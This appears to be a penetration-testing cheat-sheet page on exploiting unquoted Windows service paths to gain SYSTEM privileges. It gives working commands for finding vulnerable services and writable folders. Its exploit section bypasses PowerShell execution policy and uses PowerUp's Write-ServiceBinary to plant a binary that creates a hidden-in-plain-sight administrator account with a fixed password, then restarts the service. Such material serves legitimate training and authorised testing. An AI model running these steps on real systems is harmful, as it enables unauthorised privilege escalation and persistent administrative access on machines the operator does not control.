---
description: Unquoted Service Paths – Windows Privilege Escalation
---

# Unquoted Service Path

In simple terms, when a service is created whose executable path contains spaces and isn't enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).

### Manual Checks

Check service without quotes:

{% code overflow="wrap" %}
```powershell
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """

# or via Powershell

Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```
{% endcode %}

Check File or Directory Permissions:

{% code overflow="wrap" %}
```powershell
icacls C:\
icacls "C:\Program Files\Some Vuln Service"
powershell "get-acl -Path 'C:\Program Files\Some Vuln Service' | format-list"

# or using SysInternals AccessChk
.\accesschk64.exe -wvud "C:\" -accepteula
.\accesschk64.exe -wvud "C:\Program Files\Some Vuln Service" -accepteula
```
{% endcode %}

Check Service Permissions:

{% code overflow="wrap" %}
```powershell
# cmd
sc query VulnService
sc qc VulnService

# restart
sc stop VulnService
sc start VulnService
```
{% endcode %}

### Automated Script with PowerUp

{% code overflow="wrap" %}
```powershell
powershell -ep bypass
Import-Module PowerUp.ps1

Invoke-AllChecks
Get-ServiceUnquoted
Get-ServiceDetail "VulnService"
# exploit
Write-ServiceBinary -Name VulnService -Path "C:\Program Files\Some.exe" -UserName unquoted-user -Password Password123!

# restart from CMD
sc qc VulnService
sc stop VulnService
sc start VulnService

# check if user created
net users
net localgroup Administrators
```
{% endcode %}
